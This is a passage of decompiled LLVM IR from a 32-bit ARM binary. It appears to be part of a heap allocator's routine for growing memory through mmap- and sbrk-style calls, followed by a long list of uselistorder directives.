  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_1317c = call i32 @function_14fb4(i32 0, i32 %v0_13168, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1317c, i32* %r0.global-to-local, align 4
  %v3_13180 = icmp eq i32 %v6_1317c, -1
  %v8_13180 = icmp eq i32 %v6_1317c, -1
  store i32 %v6_1317c, i32* @r4, align 4
  br i1 %v8_13180, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_13160
  %v1_13188 = load i32, i32* %r6.global-to-local, align 4
  %v2_13188 = add i32 %v1_13188, 864
  %v3_13188 = inttoptr i32 %v2_13188 to i32*
  %v4_13188 = load i32, i32* %v3_13188, align 4
  %v2_1318c = load i32, i32* @r5, align 4
  %v3_1318c = add i32 %v2_1318c, %v6_1317c
  store i32 %v3_1318c, i32* %r0.global-to-local, align 4
  %v2_13190 = and i32 %v4_13188, -2
  store i32 %v2_13190, i32* %r3.global-to-local, align 4
  store i32 %v2_13190, i32* %v3_13188, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_13160, %bb158
  br i1 %v3_13180, label %dec_label_pc_1319c, label %dec_label_pc_131a0

dec_label_pc_1319c:                               ; preds = %.thread32, %dec_label_pc_1311c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131a0

dec_label_pc_131a0:                               ; preds = %.thread32, %dec_label_pc_1319c
  %v0_131a0 = load i32, i32* @r4, align 4
  %v7_131a0 = icmp eq i32 %v0_131a0, -1
  br i1 %v7_131a0, label %dec_label_pc_133c4, label %dec_label_pc_131a8

dec_label_pc_131a8:                               ; preds = %dec_label_pc_131a0
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %r2.global-to-local, align 4
  %v4_131b0 = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_131b0, i32* %ip.global-to-local, align 4
  store i32 %v3_130e0, i32* %r2.global-to-local, align 4
  %v1_131b8 = add i32 %v4_131b0, 872
  %v2_131b8 = inttoptr i32 %v1_131b8 to i32*
  %v3_131b8 = load i32, i32* %v2_131b8, align 4
  %v1_131bc = load i32, i32* @r8, align 4
  %v2_131bc = add i32 %v1_131bc, %v3_130e0
  store i32 %v2_131bc, i32* %r1.global-to-local, align 4
  %v0_131c0 = load i32, i32* @r5, align 4
  %v2_131c0 = add i32 %v0_131c0, %v3_131b8
  store i32 %v2_131c0, i32* %r3.global-to-local, align 4
  %v9_131c4 = icmp eq i32 %v0_131a0, %v2_131bc
  br i1 %v9_131c4, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_131a8
  store i32 %v2_131c0, i32* %v2_131b8, align 4
  br label %dec_label_pc_131e0

bb159:                                            ; preds = %dec_label_pc_131a8
  %v1_131c8 = load i32, i32* %r0.global-to-local, align 4
  %v8_131c8 = icmp eq i32 %v1_131c8, -1
  store i32 %v2_131c0, i32* %v2_131b8, align 4
  br i1 %v8_131c8, label %.thread34, label %dec_label_pc_131e0

.thread34:                                        ; preds = %bb159
  %v1_131d0 = load i32, i32* @r5, align 4
  %v2_131d0 = load i32, i32* @r8, align 4
  %v3_131d0 = add i32 %v2_131d0, %v1_131d0
  %v2_131d4 = or i32 %v3_131d0, 1
  store i32 %v2_131d4, i32* %r3.global-to-local, align 4
  %v2_131d8 = load i32, i32* %r2.global-to-local, align 4
  %v3_131d8 = add i32 %v2_131d8, 4
  %v4_131d8 = inttoptr i32 %v3_131d8 to i32*
  store i32 %v2_131d4, i32* %v4_131d8, align 4
  br label %dec_label_pc_13358

dec_label_pc_131e0:                               ; preds = %bb159, %.thread122
  %v0_131e4.pr = load i32, i32* @r8, align 4
  %v0_131e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_131e0 = add i32 %v0_131e0, 864
  %v2_131e0 = inttoptr i32 %v1_131e0 to i32*
  %v3_131e0 = load i32, i32* %v2_131e0, align 4
  store i32 %v3_131e0, i32* %r2.global-to-local, align 4
  %v2_131e4 = icmp eq i32 %v0_131e4.pr, 0
  br i1 %v2_131e4, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_131e0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_131e0
  %v2_131ec = urem i32 %v3_131e0, 2
  store i32 %v2_131ec, i32* %r3.global-to-local, align 4
  %v2_131f0 = icmp eq i32 %v2_131ec, 0
  br i1 %v2_131f0, label %.thread40, label %dec_label_pc_131f8

dec_label_pc_131f8:                               ; preds = %.thread36
  %v0_131f8 = load i32, i32* @r4, align 4
  %v1_131f8 = load i32, i32* %r1.global-to-local, align 4
  %v3_131f8 = icmp ult i32 %v0_131f8, %v1_131f8
  br i1 %v3_131f8, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_131f8
  %v2_131fc = and i32 %v3_131e0, -2
  store i32 %v2_131fc, i32* %r3.global-to-local, align 4
  store i32 %v2_131fc, i32* %v2_131e0, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_131f8, %.thread37, %.thread36, %bb160
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %ip.global-to-local, align 4
  %v4_1320c = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_1320c, i32* @r7, align 4
  %v1_13210 = add i32 %v4_1320c, 864
  %v2_13210 = inttoptr i32 %v1_13210 to i32*
  %v3_13210 = load i32, i32* %v2_13210, align 4
  store i32 %v3_13210, i32* %r3.global-to-local, align 4
  %v1_13214 = urem i32 %v3_13210, 2
  store i32 %v1_13214, i32* @r6, align 4
  %v2_13214 = icmp eq i32 %v1_13214, 0
  br i1 %v2_13214, label %dec_label_pc_132a8, label %dec_label_pc_1321c

dec_label_pc_1321c:                               ; preds = %.thread40
  %v0_1321c = load i32, i32* @r8, align 4
  %v2_1321c = icmp eq i32 %v0_1321c, 0
  br i1 %v2_1321c, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_1321c
  %v2_13220 = add i32 %v4_1320c, 872
  %v3_13220 = inttoptr i32 %v2_13220 to i32*
  %v4_13220 = load i32, i32* %v3_13220, align 4
  store i32 %v4_13220, i32* %r2.global-to-local, align 4
  %v1_13224 = load i32, i32* %r1.global-to-local, align 4
  %v2_13224 = load i32, i32* @r4, align 4
  %v3_13224 = sub i32 %v2_13224, %v1_13224
  %v3_13228 = add i32 %v3_13224, %v4_13220
  store i32 %v3_13228, i32* %r3.global-to-local, align 4
  store i32 %v3_13228, i32* %v3_13220, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_1321c, %bb161
  %v0_13230 = load i32, i32* @r4, align 4
  %v1_13230 = urem i32 %v0_13230, 8
  store i32 %v1_13230, i32* %r3.global-to-local, align 4
  %v2_13230 = icmp eq i32 %v1_13230, 0
  br i1 %v2_13230, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_13234 = sub nsw i32 8, %v1_13230
  store i32 %v2_13234, i32* %r3.global-to-local, align 4
  %v3_13238 = add i32 %v2_13234, %v0_13230
  store i32 %v3_13238, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_13240 = phi i32 [ 0, %.thread43 ], [ %v2_13234, %bb162 ]
  %v1_1323c = load i32, i32* @r5, align 4
  %v2_1323c = add i32 %v1_1323c, %v0_13230
  store i32 %v2_1323c, i32* @r6, align 4
  %v1_13240 = load i32, i32* @r8, align 4
  %v2_13240 = add i32 %v2_1323c, %v0_13240
  %v2_13244 = add i32 %v2_13240, %v1_13240
  store i32 %v2_13244, i32* %r1.global-to-local, align 4
  %v1_13248 = load i32, i32* %sb.global-to-local, align 4
  %v2_13248 = add i32 %v1_13248, %v2_13244
  %v1_1324c = load i32, i32* %fp.global-to-local, align 4
  %v2_1324c = and i32 %v1_1324c, %v2_13248
  store i32 %v2_1324c, i32* %r2.global-to-local, align 4
  %v2_13250 = sub i32 0, %v2_1323c
  store i32 %v2_13250, i32* %r3.global-to-local, align 4
  %v2_13254 = sub i32 %v2_1324c, %v2_1323c
  store i32 %v2_13254, i32* @r5, align 4
  store i32 %v2_13254, i32* %r0.global-to-local, align 4
  br i1 %v2_13230, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_13230, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_13260 = call i32 @function_15210(i32 %v2_13254)
  store i32 %v1_13260, i32* %r0.global-to-local, align 4
  %v3_13264 = icmp eq i32 %v1_13260, -1
  br i1 %v3_13264, label %dec_label_pc_1326c, label %dec_label_pc_1327c

dec_label_pc_1326c:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13270 = call i32 @function_15210(i32 0)
  store i32 %v1_13270, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_132d4

dec_label_pc_1327c:                               ; preds = %bb164
  %v1_1327c = load i32, i32* @r4, align 4
  %v3_1327c = icmp ult i32 %v1_13260, %v1_1327c
  br i1 %v3_1327c, label %dec_label_pc_13284, label %dec_label_pc_132d4

dec_label_pc_13284:                               ; preds = %dec_label_pc_1327c
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %r0.global-to-local, align 4
  %v4_1328c = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_1328c, i32* %r2.global-to-local, align 4
  %v1_13290 = add i32 %v4_1328c, 864
  %v2_13290 = inttoptr i32 %v1_13290 to i32*
  %v3_13290 = load i32, i32* %v2_13290, align 4
  %v0_13294 = load i32, i32* @r6, align 4
  store i32 %v0_13294, i32* %r0.global-to-local, align 4
  %v1_13298 = and i32 %v3_13290, -2
  store i32 %v1_13298, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_13298, i32* %v2_13290, align 4
  br label %dec_label_pc_132d4

dec_label_pc_132a8:                               ; preds = %.thread40
  %v0_132a8 = load i32, i32* %r0.global-to-local, align 4
  %v3_132a8 = icmp eq i32 %v0_132a8, -1
  br i1 %v3_132a8, label %dec_label_pc_132b0, label %dec_label_pc_132cc

dec_label_pc_132b0:                               ; preds = %dec_label_pc_132a8
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_132b4 = call i32 @function_15210(i32 0)
  store i32 %v1_132b4, i32* %r0.global-to-local, align 4
  %v0_132b8 = load i32, i32* @r7, align 4
  %v1_132b8 = add i32 %v0_132b8, 872
  %v2_132b8 = inttoptr i32 %v1_132b8 to i32*
  %v3_132b8 = load i32, i32* %v2_132b8, align 4
  store i32 %v3_132b8, i32* %r2.global-to-local, align 4
  %v0_132bc = load i32, i32* @r4, align 4
  %v0_132c0 = load i32, i32* @r5, align 4
  %v2_132bc = add i32 %v3_132b8, %v1_132b4
  %v2_132c0 = sub i32 %v2_132bc, %v0_132bc
  %v2_132c4 = sub i32 %v2_132c0, %v0_132c0
  store i32 %v2_132c4, i32* %r3.global-to-local, align 4
  store i32 %v2_132c4, i32* %v2_132b8, align 4
  %v0_132d0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_132cc

dec_label_pc_132cc:                               ; preds = %dec_label_pc_132a8, %dec_label_pc_132b0
  %v0_132d0 = phi i32 [ 0, %dec_label_pc_132a8 ], [ %v0_132d0.pre, %dec_label_pc_132b0 ]
  %v0_132cc = load i32, i32* @r4, align 4
  store i32 %v0_132cc, i32* @r7, align 4
  store i32 %v0_132d0, i32* @r5, align 4
  br label %dec_label_pc_132d4

dec_label_pc_132d4:                               ; preds = %dec_label_pc_1327c, %dec_label_pc_13284, %dec_label_pc_1326c, %dec_label_pc_132cc
  %v0_132d4 = load i32, i32* %r0.global-to-local, align 4
  %v7_132d4 = icmp eq i32 %v0_132d4, -1
  br i1 %v7_132d4, label %dec_label_pc_13358, label %dec_label_pc_132dc

dec_label_pc_132dc:                               ; preds = %dec_label_pc_132d4
  %v1_132dc = load i32, i32* @r5, align 4
  %v2_132dc = add i32 %v1_132dc, %v0_132d4
  %v0_132e0 = load i32, i32* @r7, align 4
  %v2_132e0 = sub i32 %v2_132dc, %v0_132e0
  %v1_132e4 = or i32 %v2_132e0, 1
  %v2_132e8 = add i32 %v0_132e0, 4
  %v3_132e8 = inttoptr i32 %v2_132e8 to i32*
  store i32 %v1_132e4, i32* %v3_132e8, align 4
  store i32 144312, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_132f4 = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_132f4, i32* @r6, align 4
  %v1_132f8 = add i32 %v4_132f4, 872
  %v2_132f8 = inttoptr i32 %v1_132f8 to i32*
  %v3_132f8 = load i32, i32* %v2_132f8, align 4
  %v0_132fc = load i32, i32* @r8, align 4
  %v2_132fc = icmp eq i32 %v0_132fc, 0
  %v0_13300 = load i32, i32* @r5, align 4
  %v2_13300 = add i32 %v0_13300, %v3_132f8
  store i32 %v2_13300, i32* %r3.global-to-local, align 4
  store i32 %v2_13300, i32* %v2_132f8, align 4
  %v0_13308 = load i32, i32* @r7, align 4
  %v1_13308 = load i32, i32* @r6, align 4
  %v2_13308 = add i32 %v1_13308, 44
  %v3_13308 = inttoptr i32 %v2_13308 to i32*
  store i32 %v0_13308, i32* %v3_13308, align 4
  br i1 %v2_132fc, label %dec_label_pc_13358, label %dec_label_pc_13310

dec_label_pc_13310:                               ; preds = %dec_label_pc_132dc
  %v0_13314 = load i32, i32* @r8, align 4
  %v1_13314 = add i32 %v0_13314, -12
  %v1_13318 = and i32 %v1_13314, -8
  store i32 %v3_130e0, i32* %ip.global-to-local, align 4
  %v2_13320 = add i32 %v1_13318, %v3_130e0
  store i32 %v2_13320, i32* %r1.global-to-local, align 4
  %v2_13324 = icmp ugt i32 %v1_13318, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_1332c = or i32 %v1_13318, 1
  store i32 %v1_1332c, i32* %r3.global-to-local, align 4
  store i32 %v1_1332c, i32* %v2_130ec, align 4
  %v0_13334 = load i32, i32* %r2.global-to-local, align 4
  %v1_13334 = load i32, i32* %r1.global-to-local, align 4
  %v2_13334 = add i32 %v1_13334, 8
  %v3_13334 = inttoptr i32 %v2_13334 to i32*
  store i32 %v0_13334, i32* %v3_13334, align 4
  %v0_13338 = load i32, i32* %r2.global-to-local, align 4
  %v1_13338 = load i32, i32* %r1.global-to-local, align 4
  %v2_13338 = add i32 %v1_13338, 4
  %v3_13338 = inttoptr i32 %v2_13338 to i32*
  store i32 %v0_13338, i32* %v3_13338, align 4
  br i1 %v2_13324, label %dec_label_pc_13340, label %dec_label_pc_13358

dec_label_pc_13340:                               ; preds = %dec_label_pc_13310
  %v0_13340 = load i32, i32* @r6, align 4
  %v1_13340 = add i32 %v0_13340, 836
  %v2_13340 = inttoptr i32 %v1_13340 to i32*
  %v3_13340 = load i32, i32* %v2_13340, align 4
  store i32 %v3_13340, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_13348 = load i32, i32* %ip.global-to-local, align 4
  %v1_13348 = add i32 %v0_13348, 8
  store i32 %v1_13348, i32* @r0, align 4
  store i32 -1, i32* %v2_13340, align 4
  %v0_13350 = call i32 @function_13684()
  store i32 %v0_13350, i32* %r0.global-to-local, align 4
  %v0_13354 = load i32, i32* @r4, align 4
  %v1_13354 = load i32, i32* @r6, align 4
  %v2_13354 = add i32 %v1_13354, 836
  %v3_13354 = inttoptr i32 %v2_13354 to i32*
  store i32 %v0_13354, i32* %v3_13354, align 4
  br label %dec_label_pc_13358

dec_label_pc_13358:                               ; preds = %.thread34, %dec_label_pc_13310, %dec_label_pc_132dc, %dec_label_pc_132d4, %dec_label_pc_13340
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 144312, i32* %r0.global-to-local, align 4
  %v4_13360 = load i32, i32* inttoptr (i32 144348 to i32*), align 4
  store i32 %v4_13360, i32* %lr.global-to-local, align 4
  %v1_13364 = add i32 %v4_13360, 872
  store i32 %v1_13364, i32* %r1.global-to-local, align 4
  %v1_13368 = inttoptr i32 %v1_13364 to i32*
  %v2_13368 = load i32, i32* %v1_13368, align 4
  store i32 %v2_13368, i32* %r1.global-to-local, align 4
  %v3_13368 = add i32 %v4_13360, 876
  %v4_13368 = inttoptr i32 %v3_13368 to i32*
  %v5_13368 = load i32, i32* %v4_13368, align 4
  store i32 %v5_13368, i32* %r3.global-to-local, align 4
  %v1_13370 = add i32 %v4_13360, 868
  %v2_13370 = inttoptr i32 %v1_13370 to i32*
  %v3_13370 = load i32, i32* %v2_13370, align 4
  store i32 %v3_13370, i32* %r3.global-to-local, align 4
  %v1_13374 = add i32 %v4_13360, 884
  %v2_13374 = inttoptr i32 %v1_13374 to i32*
  %v3_13374 = load i32, i32* %v2_13374, align 4
  store i32 %v3_13374, i32* %r2.global-to-local, align 4
  %v2_13378 = add i32 %v3_13370, %v2_13368
  store i32 %v2_13378, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_13368, %v5_13368
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_13358
  store i32 %v2_13368, i32* %v4_13368, align 4
  %v0_13380.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_13380.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_13358, %bb165
  %v1_13380 = phi i32 [ %v3_13374, %dec_label_pc_13358 ], [ %v1_13380.pre, %bb165 ]
  %v4_13384 = phi i32 [ %v2_13378, %dec_label_pc_13358 ], [ %v0_13380.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_13384, %v1_13380
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_13384 = load i32, i32* %lr.global-to-local, align 4
  %v6_13384 = add i32 %v5_13384, 884
  %v7_13384 = inttoptr i32 %v6_13384 to i32*
  store i32 %v4_13384, i32* %v7_13384, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_13388 = load i32, i32* %lr.global-to-local, align 4
  %v1_13388 = add i32 %v0_13388, 44
  %v2_13388 = inttoptr i32 %v1_13388 to i32*
  %v3_13388 = load i32, i32* %v2_13388, align 4
  store i32 %v3_13388, i32* %ip.global-to-local, align 4
  %v1_1338c = add i32 %v3_13388, 4
  %v2_1338c = inttoptr i32 %v1_1338c to i32*
  %v3_1338c = load i32, i32* %v2_1338c, align 4
  store i32 %v1_12fa0, i32* %r1.global-to-local, align 4
  %v1_13394 = and i32 %v3_1338c, -4
  store i32 %v1_13394, i32* %r3.global-to-local, align 4
  %v3_13398 = icmp ult i32 %v1_13394, %v1_12fa0
  br i1 %v3_13398, label %dec_label_pc_133c4, label %dec_label_pc_133a0

dec_label_pc_133a0:                               ; preds = %bb168
  %v0_133a0 = load i32, i32* @sl, align 4
  %v2_133a0 = sub i32 %v1_13394, %v0_133a0
  %v2_133a4 = add i32 %v0_133a0, %v3_13388
  store i32 %v2_133a4, i32* %r1.global-to-local, align 4
  %v1_133a8 = or i32 %v2_133a0, 1
  store i32 %v1_133a8, i32* %r3.global-to-local, align 4
  %v1_133ac = or i32 %v0_133a0, 1
  store i32 %v1_133ac, i32* %r2.global-to-local, align 4
  %v1_133b0 = add i32 %v3_13388, 8
  store i32 %v1_133b0, i32* %r0.global-to-local, align 4
  store i32 %v1_133ac, i32* %v2_1338c, align 4
  %v0_133b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_133b8 = load i32, i32* %lr.global-to-local, align 4
  %v2_133b8 = add i32 %v1_133b8, 44
  %v3_133b8 = inttoptr i32 %v2_133b8 to i32*
  store i32 %v0_133b8, i32* %v3_133b8, align 4
  %v0_133bc = load i32, i32* %r3.global-to-local, align 4
  %v1_133bc = load i32, i32* %r1.global-to-local, align 4
  %v2_133bc = add i32 %v1_133bc, 4
  %v3_133bc = inttoptr i32 %v2_133bc to i32*
  store i32 %v0_133bc, i32* %v3_133bc, align 4
  br label %dec_label_pc_133d4

dec_label_pc_133c4:                               ; preds = %bb157, %bb168, %dec_label_pc_131a0
  %v0_133c4 = call i32 @function_1095c()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_133cc = inttoptr i32 %v0_133c4 to i32*
  store i32 12, i32* %v2_133cc, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_133d4

dec_label_pc_133d4:                               ; preds = %bb151, %bb150, %dec_label_pc_133a0, %dec_label_pc_12fe8, %dec_label_pc_133c4
  %v0_133d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_133d4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_133d8

dec_label_pc_133d8:                               ; preds = %.thread1, %dec_label_pc_12fb4, %dec_label_pc_12e18, %dec_label_pc_12c80, %dec_label_pc_12c04, %.thread121, %dec_label_pc_12e24, %dec_label_pc_133d4
  store i32 %v2_12b2c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r3, align 4
  store i32 144312, i32* %r2.global-to-local, align 4
  %v4_133e8 = load i32, i32* inttoptr (i32 144340 to i32*), align 4
  store i32 %v4_133e8, i32* @ip, align 4
  store i32 78836, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_133e8)
  br label %dec_label_pc_133f4

dec_label_pc_133f4:                               ; preds = %dec_label_pc_12b64, %dec_label_pc_133d8
  %v0_133f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_133f4, i32* %r0.global-to-local, align 4
  store i32 %v3_12b00, i32* @r4, align 4
  store i32 %v6_12b00, i32* @r5, align 4
  store i32 %v9_12b00, i32* @r6, align 4
  store i32 %v12_12b00, i32* @r7, align 4
  store i32 %v15_12b00, i32* @r8, align 4
  store i32 %v18_12b00, i32* @sb, align 4
  store i32 %v21_12b00, i32* @sl, align 4
  store i32 %v24_12b00, i32* @fp, align 4
  store i32 %v27_12b00, i32* @lr, align 4
  ret i32 %v0_133f4

; uselistorder directives
  uselistorder i32 %v0_133a0, { 1, 0, 2 }
  uselistorder i32 %v3_13388, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13384, { 1, 0 }
  uselistorder i32 %v2_13368, { 2, 0, 1, 3 }
  uselistorder i32 %v4_13360, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_13318, { 1, 2, 0 }
  uselistorder i32 %v0_132e0, { 1, 0 }
  uselistorder i32 %v0_132d4, { 1, 0 }
  uselistorder i32 %v2_132c4, { 1, 0 }
  uselistorder i32 %v2_13254, { 2, 1, 0 }
  uselistorder i32 %v2_1323c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_13234, { 1, 0, 2 }
  uselistorder i32 %v1_13230, { 2, 1, 0 }
  uselistorder i32 %v0_13230, { 3, 1, 2, 0 }
  uselistorder i32 %v1_13214, { 1, 0 }
  uselistorder i32 %v2_131ec, { 1, 0 }
  uselistorder i32 %v3_131e0, { 1, 0, 2 }
  uselistorder i32 %v2_131c0, { 1, 0, 2 }
  uselistorder i32* %v2_131b8, { 1, 0, 2 }
  uselistorder i32 %v0_131a0, { 1, 0 }
  uselistorder i32 %v6_1317c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13168, { 2, 1, 0 }
  uselistorder i32 %v0_13150, { 1, 0 }
  uselistorder i32 %v2_1310c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13108, { 1, 0 }
  uselistorder i32 %v3_130e0, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_130c0, { 1, 0, 2 }
  uselistorder i32 %v2_130a8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_13050, { 2, 1, 0 }
  uselistorder i32 %v6_13044, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_13020, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12fe0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12fa0, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_12f98, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12f94, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_12f80, { 1, 0 }
  uselistorder i32 %v7_12f40, { 1, 0 }
  uselistorder i32 %v4_12f40, { 1, 0 }
  uselistorder i32 %v0_12f10, { 1, 0 }
  uselistorder i32 %v2_12ee4, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_12ee054, { 1, 0 }
  uselistorder i32 %v1_12eac, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_12e94., { 1, 2, 0 }
  uselistorder i32 %v0_12e9c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_12e9c, { 1, 0 }
  uselistorder i32 %v3_12e7c, { 1, 0 }
  uselistorder i32 %v4_12e78, { 1, 0, 2 }
  uselistorder i32 %v1_12de8, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12e40, { 1, 0 }
  uselistorder i32 %v1_12e24, { 1, 0 }
  uselistorder i32 %v1_12cc4, { 1, 0 }
  uselistorder i32 %v0_12e04, { 2, 0, 1, 3 }
  uselistorder i32 %v3_12dcc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12e60.pre, { 1, 2, 0 }
  uselistorder i32 %v0_12da8, { 2, 1, 0 }
  uselistorder i32 %v3_12d9c, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_12cbc, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_12d64, { 1, 0 }
  uselistorder i32 %v3_12d58, { 1, 0 }
  uselistorder i32 %v0_12d64, { 1, 0 }
  uselistorder i32 %v3_12d3c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_12d2c, { 1, 0, 2 }
  uselistorder i32 %v3_12ce4, { 2, 1, 0 }
  uselistorder i32 %v0_12cd4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12ca4, { 1, 0 }
  uselistorder i32 %v1_12c58, { 2, 1, 0, 3 }
  uselistorder i32 %v0_12c54, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_12bf8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_12bec, { 1, 0 }
  uselistorder i32 %v3_12bbc, { 1, 0 }
  uselistorder i32 %v0_12bb0, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_12b90, { 0, 2, 1, 3 }
  uselistorder i1 %v7_12b84, { 1, 0 }
  uselistorder i32 %v0_12b5c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 15, 0, 1, 12, 13, 14, 2, 16, 4, 5, 3, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 1, 2, 49, 50, 51, 52, 53, 54, 55, 56, 86, 91, 87, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 58, 66, 106, 107, 108, 109, 57, 59, 60, 61, 62, 0, 63, 64, 65, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 32, 55, 56, 57, 28, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 27, 33, 28, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 31, 7, 8, 9, 10, 22, 14, 11, 23, 12, 13, 16, 15, 20, 17, 24, 19, 18, 25, 21, 4, 27, 26, 28, 3, 29, 32, 30, 54, 50, 51, 49, 52, 53, 55, 56, 57, 58, 48, 59, 33, 38, 35, 34, 36, 37, 39, 2, 40, 41, 42, 43, 1, 44, 47, 46, 45, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 11, 12, 13, 10 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 34, 35, 36, 37, 38, 39, 40, 0, 41, 42, 27, 26, 19, 16, 1, 17, 18, 20, 21, 22, 23, 24, 25, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_14fb4, { 1, 0 }
  uselistorder i32 (i32)* @function_12a88, { 1, 0 }
  uselistorder label %dec_label_pc_133f4, { 1, 0 }
  uselistorder label %dec_label_pc_133d8, { 7, 1, 5, 6, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_133d4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_133c4, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_13358, { 4, 1, 2, 3, 0 }
